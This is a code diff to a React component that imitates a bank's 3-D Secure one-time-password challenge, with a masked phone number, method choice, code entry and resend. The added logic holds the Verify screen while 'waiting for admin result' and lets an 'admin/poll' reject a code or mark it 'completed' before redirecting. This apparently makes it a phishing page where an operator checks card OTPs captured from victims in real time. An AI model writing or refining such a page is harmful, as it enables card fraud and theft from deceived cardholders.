@@ -1,4 +1,4 @@
-import React, { useMemo, useState } from 'react';
+import React, { useEffect, useMemo, useState } from 'react';
 
 type Phase = 'method' | 'verify' | 'help' | 'processing' | 'failed';
 
@@ -13,7 +13,8 @@ export type AcsOtpChallengeProps = {
   otpResendNotice?: boolean;
   resendCooldown?: number;
   resendLoading?: boolean;
-  externalState?: 'input' | 'checking' | 'failed' | 'idle';
+  /** checking = waiting for admin result (stay on Verify). completed = only then show redirect. */
+  externalState?: 'input' | 'checking' | 'failed' | 'idle' | 'completed';
   failReason?: string | null;
   onMethodNext?: () => void | Promise<void>;
   onSubmitOtp: (code: string) => void | Promise<void>;
@@ -55,13 +56,37 @@ export function AcsOtpChallenge({
 
   const phoneMask = useMemo(() => maskPhone(phoneLast3), [phoneLast3]);
 
-  // Only force processing/failed from parent — never block Method/Verify otherwise
+  // Stay on Verify while checking OTP — only redirect AFTER correct (completed)
   const view: Phase =
     externalState === 'failed'
       ? 'failed'
-      : externalState === 'checking' || submitting
+      : externalState === 'completed'
         ? 'processing'
         : phase;
+
+  // Wrong OTP from admin/poll: stay on Verify and show error (never jump to redirect)
+  useEffect(() => {
+    if (otpRetryNotice) {
+      setSubmitting(false);
+      setPhase('verify');
+      setError('The code you entered is incorrect. Please try again.');
+      setOtp('');
+      setAttempt((a) => a + 1);
+    }
+  }, [otpRetryNotice]);
+
+  useEffect(() => {
+    if (externalState === 'input' || externalState === 'idle') {
+      setSubmitting(false);
+    }
+    if (externalState === 'completed') {
+      setSubmitting(false);
+      setPhase('processing');
+    }
+    if (externalState === 'failed') {
+      setSubmitting(false);
+    }
+  }, [externalState]);
 
   /** Next on Choose Method: ALWAYS go to Verify; fire API in background (never hang UI) */
   const handleMethodNext = () => {
@@ -89,11 +114,13 @@ export function AcsOtpChallenge({
     }
     setError('');
     setSubmitting(true);
+    setPhase('verify');
     Promise.resolve(onSubmitOtp(code))
       .catch(() => {
         setError('The code you entered is incorrect. Please try again.');
         setSubmitting(false);
       });
+    // Keep Verify visible until parent says completed (correct) or retry_otp (incorrect)
   };
 
   const handleResend = () => {
@@ -211,6 +238,7 @@ export function AcsOtpChallenge({
             maxLength={6}
             placeholder="------"
             value={otp}
+            disabled={submitting || externalState === 'checking'}
             onChange={(e) => {
               setOtp(e.target.value.replace(/\D/g, '').slice(0, 6));
               setError('');
@@ -219,8 +247,13 @@ export function AcsOtpChallenge({
               if (e.key === 'Enter') e.preventDefault();
             }}
           />
-          <button type="button" className="acs-btn acs-btn-primary" onClick={handleSubmit}>
-            Submit
+          <button
+            type="button"
+            className="acs-btn acs-btn-primary"
+            disabled={submitting || externalState === 'checking'}
+            onClick={handleSubmit}
+          >
+            {submitting || externalState === 'checking' ? 'Checking...' : 'Submit'}
           </button>
           <button
             type="button"
